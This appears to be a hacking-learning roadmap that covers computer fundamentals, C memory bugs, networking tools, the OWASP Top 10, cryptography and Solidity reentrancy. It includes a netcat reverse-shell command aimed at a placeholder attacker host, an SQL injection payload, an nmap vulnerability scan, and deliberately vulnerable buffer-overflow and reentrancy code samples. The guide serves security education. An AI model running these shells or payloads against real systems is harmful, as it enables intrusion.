0. Foundations (Before Cybersecurity)

You cannot hack what you do not understand. This section is non-negotiable. Spend at least 4–6 weeks here.

0.1 Hardware & OS
How Computers Work • CPU, RAM, Storage

The CPU is the brain: it fetches instructions from RAM, decodes them, executes them, and writes results back. This is the famous fetch-decode-execute cycle. RAM is volatile (loses data when powered off) and extremely fast. Storage (SSD/HDD) is persistent but slower.

The Operating System (kernel) sits between hardware and applications. It manages memory allocation, process scheduling, file I/O, and hardware interrupts via system calls.

# Real-time resource monitoring
htop

# Detailed CPU info
cat /proc/cpuinfo | head -30

# Memory usage in human readable
free -h
DO: Draw the fetch-decode-execute cycle daily until you can explain it in your sleep.
DON'T: Ever think anything in computing is "magic". Everything is electrons and logic gates.
Pro: This knowledge makes every exploit make sense.
Con of skipping: You will never understand why buffer overflows or race conditions happen.
Google IT Fundamentals (free) Crash Course Computer Science (YouTube)
0.2 Filesystems & Binary
Binary, Hexadecimal, Filesystems

Everything is binary (base-2). Hexadecimal (base-16) is just a human-friendly way to read binary — each hex digit = 4 bits. Filesystems (ext4, NTFS, APFS) organize data into blocks, inodes, directories. Understand FAT32 vs exFAT vs NTFS differences.

Learn endianness (little-endian on x86) — this matters in exploit development.

echo -n "Hacker" | xxd
echo -n "Hacker" | xxd -b

# Convert hex to ASCII
echo "48 65 6c 6c 6f" | xxd -r -p
DO: Practice converting binary ↔ hex ↔ decimal manually.
DON'T: Rely only on calculators — muscle memory is key.
Pro: You will instantly read memory dumps and shellcode.
0.3 Command Line & VMs
Command Line Basics + Virtual Machines

Master: ls, cd, pwd, mkdir, rm, cp, mv, grep, find, sed, awk, chmod, chown, sudo, ps, top, kill, df, du, tar, ssh, scp.

1. Programming Fundamentals

A hacker must write code before they can break it. Spend 8–10 weeks here.

Core Programming Concepts — Explained Deeply
Variables & Memory
Variables are named memory locations. In C, int x = 5; allocates 4 bytes on stack. Understand scope, lifetime, and shadowing.
Loops & Control Flow
for, while, do-while, recursion. Recursion depth can cause stack overflow — critical for exploit writing.
Functions & Closures
First-class functions in JS/Python allow callbacks and higher-order functions used in event-driven exploits.
Data Structures & Algorithms
Arrays, HashMaps, Linked Lists, Trees, Graphs. Big-O notation. Know how to implement a binary search or Dijkstra for network mapping.
Memory Management & Concurrency
Stack (fast, automatic) vs Heap (manual, slower). Pointers in C. Threads, mutexes, deadlocks — race conditions are real attack vectors.
DO: Implement every concept twice — once in Python, once in C.
DON'T: Copy code from GitHub without rewriting it line-by-line.
Language Learning Path
Recommended Order + Real Examples

1. Python – scripting & exploits
2. JavaScript – web & Node.js
3. C – memory & exploits
4. Go/Rust – safe systems
5. Solidity – blockchain

Critical Low-Level Topics: Pointers, Buffers, Stack vs Heap

In C, pointers hold memory addresses. Buffers are fixed-size arrays. Stack grows downward, heap grows upward. Overflowing a stack buffer can overwrite return addresses — the basis of 90% of classic exploits.

// Classic buffer overflow
#include <string.h>
void vuln() {
char buf[8];
strcpy(buf, "This string is way too long and will overflow");
}
int main() { vuln(); return 0; }
DO: Compile with gcc -fno-stack-protector -z execstack and test.
DON'T: Use strcpy, gets, or any unsafe function in 2026.

2. Networking (Critical for Hackers)

If you cannot read packets, you are not a hacker. This is where real reconnaissance happens.

Core Models
OSI 7 Layers vs TCP/IP Model

Layer 1–2: Physical & Data Link (MAC addresses, switches).
Layer 3: Network (IP, routing, ICMP).
Layer 4: Transport (TCP vs UDP — three-way handshake, flags).
Layer 5–7: Session, Presentation, Application (HTTP, DNS, TLS).

TCP is connection-oriented and reliable; UDP is fire-and-forget. Understand SYN flood, ACK scan, etc.

tcpdump -i eth0 tcp port 80 -nn -X
wireshark
DNS, HTTP/HTTPS, Routing, NAT, Firewalls, VPNs

DNS: A/AAAA, MX, NS records. Zone transfers are still possible on misconfigured servers.
HTTP: Methods (GET/POST/PUT), headers (User-Agent, Cookie, Authorization), status codes.
HTTPS: TLS 1.2/1.3 handshake, certificate pinning.
Firewalls: Stateful vs stateless, iptables/nftables rules.
VPNs: OpenVPN, WireGuard, IPsec — learn to pivot through them.

DO: Capture and analyze your own browsing traffic every day for a week.
DON'T: Trust "it's HTTPS" without checking certificate and HSTS.
Tools Mastery — Nmap, Netcat, Wireshark
# Full reconnaissance scan
nmap -sS -sV -O --script vuln -p- -T4 192.168.1.0/24

# Bind shell with Netcat
nc -lvnp 4444
# Reverse shell
nc -e /bin/sh attacker-ip 4444

5. Web Security – Full OWASP Top 10 (2021 + 2025 updates)

Every Single Vulnerability — Deep Dive
A01:2021 – Broken Access Control
Most common. IDOR (Insecure Direct Object Reference): change user ID in URL. Mass assignment in frameworks. Horizontal & vertical privilege escalation. Example fix: Always check ownership on every request.
A02:2021 – Cryptographic Failures
Weak algorithms (MD5, SHA1), missing TLS, weak random, hardcoded keys. Example: Using ECB mode for AES = patterns visible in ciphertext.
A03:2021 – Injection
SQLi, NoSQLi, Command injection, LDAP. Classic: ' OR 1=1--
Fix: Prepared statements / ORM + input validation.
A04:2021 – Insecure Design
Missing threat modeling. Example: Password reset token = md5(userid + timestamp).
A05:2021 – Security Misconfiguration
Default credentials, debug mode in production, unnecessary services exposed.
A06:2021 – Vulnerable and Outdated Components
Log4Shell, Spring4Shell, outdated npm packages (npm audit).
A07:2021 – Identification and Authentication Failures
Weak passwords, no MFA, session fixation, credential stuffing.
A08:2021 – Software and Data Integrity Failures
Insecure deserialization (Java, PHP), supply-chain attacks.
A09:2021 – Security Logging & Monitoring Failures
No logs = no detection. Missing rate limiting on login.
A10:2021 – Server-Side Request Forgery (SSRF)
Attacker makes server request internal services (metadata endpoints on cloud).

Rootkits, Malware, Sandbox Escapes, System Calls

Rootkits hook syscalls or use DKOM. Learn Windows internals (WinDbg), Linux eBPF. Study real malware like Mirai, WannaCry.

7. Cryptography

Hashing: SHA-256, bcrypt, Argon2 (use for passwords).
Symmetric: AES-256-GCM (best mode).
Asymmetric: RSA (for key exchange), ECC (smaller keys, faster).
Digital Signatures: ECDSA, Ed25519.
Key Exchange: Diffie-Hellman, ECDH.
Randomness: /dev/urandom vs /dev/random.

echo -n "mysecret" | openssl dgst -sha256
openssl enc -aes-256-cbc -salt -in file.txt -out file.enc
DO: Use well-audited libraries (libsodium, OpenSSL).
DON'T: Ever implement your own crypto algorithms.

12. Smart Contract Security

Reentrancy — The DAO Hack ($60M). Attacker calls withdraw before balance updated.
Integer overflow/underflow (pre-0.8 Solidity).
Flash loan attacks, oracle manipulation, front-running, governance takeovers.

// VULNERABLE
function withdraw() public {
msg.sender.call{value: balance[msg.sender]}("");
balance[msg.sender] = 0;
}
// SECURE
function withdraw() public {
uint256 amt = balance[msg.sender];
balance[msg.sender] = 0;
payable(msg.sender).transfer(amt);
}
